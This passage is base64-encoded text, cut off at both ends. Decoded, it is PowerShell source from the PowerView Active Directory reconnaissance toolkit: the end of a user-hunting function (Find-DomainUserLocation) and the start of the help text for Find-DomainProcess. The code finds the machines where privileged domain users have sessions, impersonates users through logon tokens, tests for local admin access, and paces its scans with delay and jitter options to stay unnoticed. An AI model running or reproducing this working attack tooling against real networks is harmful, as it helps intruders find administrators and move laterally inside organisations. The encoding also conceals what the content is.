WFsKCkuVXNlck5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRDdXJyZW50VXNlciA9IChbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkuVG9Mb3dlcigpCiAgICAgICAgfQoKICAgICAgICAjIG5vdyBidWlsZCB0aGUgdXNlciB0YXJnZXQgc2V0CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2hvd0FsbCddKSB7CiAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEAoKQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckxEQVBGaWx0ZXInXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBZG1pbkNvdW50J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFsbG93RGVsZWdhdGlvbiddKSB7CiAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEdldC1Eb21haW5Vc2VyIEBVc2VyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBzYW1hY2NvdW50bmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0lkZW50aXR5JyA9ICRVc2VyR3JvdXBJZGVudGl0eQogICAgICAgICAgICAgICAgJ1JlY3Vyc2UnID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyRG9tYWluJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkVXNlclNlYXJjaEJhc2UgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluR3JvdXBNZW1iZXIgQEdyb3VwU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXJOYW1lCiAgICAgICAgfQoKICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIFRhcmdldFVzZXJzIGxlbmd0aDogJCgkVGFyZ2V0VXNlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoKC1ub3QgJFNob3dBbGwpIC1hbmQgKCRUYXJnZXRVc2Vycy5MZW5ndGggLWVxIDApKSB7CiAgICAgICAgICAgIHRocm93ICdbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIE5vIHVzZXJzIGZvdW5kIHRvIHRhcmdldCcKICAgICAgICB9CgogICAgICAgICMgdGhlIGhvc3QgZW51bWVyYXRpb24gYmxvY2sgd2UncmUgdXNpbmcgdG8gZW51bWVyYXRlIGFsbCBzZXJ2ZXJzCiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRUYXJnZXRVc2VycywgJEN1cnJlbnRVc2VyLCAkU3RlYWx0aCwgJFRva2VuSGFuZGxlKQoKICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgIyBpbXBlcnNvbmF0ZSB0aGUgdGhlIHRva2VuIHByb2R1Y2VkIGJ5IExvZ29uVXNlcigpL0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbgogICAgICAgICAgICAgICAgJE51bGwgPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLVRva2VuSGFuZGxlICRUb2tlbkhhbmRsZSAtUXVpZXQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICAkU2Vzc2lvbnMgPSBHZXQtTmV0U2Vzc2lvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTZXNzaW9uIGluICRTZXNzaW9ucykgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkU2Vzc2lvbi5Vc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkQ05hbWUgPSAkU2Vzc2lvbi5DTmFtZQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDTmFtZSAtYW5kICRDTmFtZS5TdGFydHNXaXRoKCdcXCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ05hbWUgPSAkQ05hbWUuVHJpbVN0YXJ0KCdcJykKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgIyBtYWtlIHN1cmUgd2UgaGF2ZSBhIHJlc3VsdCwgYW5kIGlnbm9yZSBjb21wdXRlciQgc2Vzc2lvbnMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkVXNlck5hbWUpIC1hbmQgKCRVc2VyTmFtZS5UcmltKCkgLW5lICcnKSAtYW5kICgkVXNlck5hbWUgLW5vdG1hdGNoICRDdXJyZW50VXNlcikgLWFuZCAoJFVzZXJOYW1lIC1ub3RtYXRjaCAnXCQkJykpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoICgtbm90ICRUYXJnZXRVc2VycykgLW9yICgkVGFyZ2V0VXNlcnMgLWNvbnRhaW5zICRVc2VyTmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uRnJvbScgJENOYW1lCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgdHJ5IHRvIHJlc29sdmUgdGhlIEROUyBob3N0bmFtZSBvZiAkQ25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ05hbWVETlNOYW1lID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEVudHJ5KCRDTmFtZSkgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBIb3N0TmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1Nlc3Npb25Gcm9tTmFtZScgJENuYW1lRE5TTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnU2Vzc2lvbkZyb21OYW1lJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzZWUgaWYgd2UncmUgY2hlY2tpbmcgdG8gc2VlIGlmIHdlIGhhdmUgbG9jYWwgYWRtaW4gYWNjZXNzIG9uIHRoaXMgbWFjaGluZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ2hlY2tBY2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFkbWluID0gKFRlc3QtQWRtaW5BY2Nlc3MgLUNvbXB1dGVyTmFtZSAkQ05hbWUpLklzQWRtaW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMb2NhbEFkbWluJyAkQWRtaW4uSXNBZG1pbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMb2NhbEFkbWluJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyTG9jYXRpb24nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU3RlYWx0aCkgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHdlJ3JlIG5vdCAnc3RlYWx0aHknLCBlbnVtZXJhdGUgbG9nZ2Vkb24gdXNlcnMgYXMgd2VsbAogICAgICAgICAgICAgICAgICAgICAgICAkTG9nZ2VkT24gPSBHZXQtTmV0TG9nZ2Vkb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFVzZXIgaW4gJExvZ2dlZE9uKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkVXNlci5Vc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSAkVXNlci5Mb2dvbkRvbWFpbgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgbWFrZSBzdXJlIHdldCBoYXZlIGEgcmVzdWx0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRVc2VyTmFtZSkgLWFuZCAoJFVzZXJOYW1lLnRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCAoLW5vdCAkVGFyZ2V0VXNlcnMpIC1vciAoJFRhcmdldFVzZXJzIC1jb250YWlucyAkVXNlck5hbWUpIC1hbmQgKCRVc2VyTmFtZSAtbm90bWF0Y2ggJ1wkJCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJUEFkZHJlc3MgPSBAKFJlc29sdmUtSVBBZGRyZXNzIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyKVswXS5JUEFkZHJlc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyRG9tYWluJyAkVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lQQWRkcmVzcycgJElQQWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Nlc3Npb25Gcm9tJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlckxvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Nlc3Npb25Gcm9tTmFtZScgJE51bGwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc2VlIGlmIHdlJ3JlIGNoZWNraW5nIHRvIHNlZSBpZiB3ZSBoYXZlIGxvY2FsIGFkbWluIGFjY2VzcyBvbiB0aGlzIG1hY2hpbmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDaGVja0FjY2VzcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFkbWluID0gVGVzdC1BZG1pbkFjY2VzcyAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMb2NhbEFkbWluJyAkQWRtaW4uSXNBZG1pbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJMb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMb2NhbEFkbWluJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlVzZXJMb2NhdGlvbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTG9jYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJExvZ29uVG9rZW4gPSAkTnVsbAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewogICAgICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1RdWlldAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICMgb25seSBpZ25vcmUgdGhyZWFkaW5nIGlmIC1EZWxheSBpcyBwYXNzZWQKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVyIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCgogICAgICAgICAgICAgICAgIyBzbGVlcCBmb3Igb3VyIHNlbWktcmFuZG9taXplZCBpbnRlcnZhbAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQoKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblVzZXJMb2NhdGlvbl0gRW51bWVyYXRpbmcgc2VydmVyICRDb21wdXRlciAoJENvdW50ZXIgb2YgJCgkVGFyZ2V0Q29tcHV0ZXJzLkNvdW50KSkiCiAgICAgICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLUFyZ3VtZW50TGlzdCAkVGFyZ2V0Q29tcHV0ZXIsICRUYXJnZXRVc2VycywgJEN1cnJlbnRVc2VyLCAkU3RlYWx0aCwgJExvZ29uVG9rZW4KCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtYW5kICRTdG9wT25TdWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluVXNlckxvY2F0aW9uXSBUYXJnZXQgdXNlciBmb3VuZCwgcmV0dXJuaW5nIGVhcmx5IgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Vc2VyTG9jYXRpb25dIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdUYXJnZXRVc2VycycgPSAkVGFyZ2V0VXNlcnMKICAgICAgICAgICAgICAgICdDdXJyZW50VXNlcicgPSAkQ3VycmVudFVzZXIKICAgICAgICAgICAgICAgICdTdGVhbHRoJyA9ICRTdGVhbHRoCiAgICAgICAgICAgICAgICAnVG9rZW5IYW5kbGUnID0gJExvZ29uVG9rZW4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbiB1c2luZyB0aGUgJEhvc3RFbnVtQmxvY2sgKyBwYXJhbXMKICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1Eb21haW5Qcm9jZXNzIHsKPCMKLlNZTk9QU0lTCgpTZWFyY2hlcyBmb3IgcHJvY2Vzc2VzIG9uIHRoZSBkb21haW4gdXNpbmcgV01JLCByZXR1cm5pbmcgcHJvY2Vzc2VzCnRoYXQgbWF0Y2ggYSBwYXJ0aWN1bGFyIHVzZXIgc3BlY2lmaWNhdGlvbiBvciBwcm9jZXNzIG5hbWUuCgpUaGFua3MgdG8gQHBhdWxicmFuZGF1IGZvciB0aGUgYXBwcm9hY2ggaWRlYS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbkNvbXB1dGVyLCBHZXQtRG9tYWluVXNlciwgR2V0LURvbWFpbkdyb3VwTWVtYmVyLCBHZXQtV01JUHJvY2VzcywgTmV3LVRocmVhZGVkRnVuY3Rpb24gIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIGVudW1lcmF0ZXMgYWxsIG1hY2hpbmVzIG9uIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbgp1c2luZyBHZXQtRG9tYWluQ29tcHV0ZXIsIGFuZCBxdWVyaWVzIHRoZSBkb21haW4gZm9yIHVzZXJzIG9mIGEgc3BlY2lmaWVkIGdyb3VwCihkZWZhdWx0ICdEb21haW4gQWRtaW5zJykgd2l0aCBHZXQtRG9tYWluR3JvdXBNZW1iZXIuIFRoZW4gZm9yIGVhY2ggc2VydmVyIHRoZQpmdW5jdGlvbiBlbnVtZXJhdGVzIGFueSBjdXJyZW50IHByb2Nlc3NlcyBydW5uaW5nIHdpdGggR2V0LVdNSVByb2Nlc3MsCnNlYXJjaGluZyBmb3IgcHJvY2Vzc2VzIHJ1bm5pbmcgdW5kZXIgYW55IHRhcmdldCB1c2VyIGNvbnRleHRzIG9yIHdpdGggdGhlCnNwZWNpZmllZCAtUHJvY2Vzc05hbWUuIElmIC1DcmVkZW50aWFsIGlzIHBhc3NlZCwgaXQgaXMgcGFzc2VkIHRocm91Z2ggdG8KdGhlIHVuZGVybHlpbmcgV01JIGNvbW1hbmRzIHVzZWQgdG8gZW51bWVyYXRlIHRoZSByZW1vdGUgbWFjaGluZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIGFuIGFycmF5IG9mIG9uZSBvciBtb3JlIGhvc3RzIHRvIGVudW1lcmF0ZSwgcGFzc2FibGUgb24gdGhlIHBpcGVsaW5lLgpJZiAtQ29tcHV0ZXJOYW1lIGlzIG5vdCBwYXNzZWQsIHRoZSBkZWZhdWx0IGJlaGF2aW9yIGlzIHRvIGVudW1lcmF0ZSBhbGwgbWFjaGluZXMKaW4gdGhlIGRvbWFpbiByZXR1cm5lZCBieSBHZXQtRG9tYWluQ29tcHV0ZXIuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGNvbXB1dGVycyBBTkQgdXNlcnMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHF1ZXJ5IGZvciBjb21wdXRlcnMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIHNlYXJjaCBmb3IgY29tcHV0ZXIgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTZWFyY2hCYXNlCgpTcGVjaWZpZXMgdGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciBjb21wdXRlcnMsCmUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIuIFVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJVbmNvbnN0cmFpbmVkCgpTd2l0Y2guIFNlYXJjaCBjb21wdXRlciBvYmplY3RzIHRoYXQgaGF2ZSB1bmNvbnN0cmFpbmVkIGRlbGVnYXRpb24uCgouUEFSQU1FVEVSIENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VydmljZVBhY2sKClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcGFjaywgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNpdGVOYW1lCgpTZWFyY2ggY29tcHV0ZXJzIGluIHRoZSBzcGVjaWZpYyBBRCBTaXRlIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgUHJvY2Vzc05hbWUKClNlYXJjaCBmb3IgcHJvY2Vzc2VzIHdpdGggb25lIG9yIG1vcmUgc3BlY2lmaWMgbmFtZXMuCgouUEFSQU1FVEVSIFVzZXJJZGVudGl0eQoKU3BlY2lmaWVzIG9uZSBvciBtb3JlIHVzZXIgaWRlbnRpdGllcyB0byBzZWFyY2ggZm9yLgoKLlBBUkFNRVRFUiBVc2VyRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgdXNlcnMgdG8gc2VhcmNoIGZvciwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBVc2VyTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBzZWFyY2ggZm9yIHRhcmdldCB1c2Vycy4KCi5QQVJBTUVURVIgVXNlclNlYXJjaEJhc2UKClNwZWNp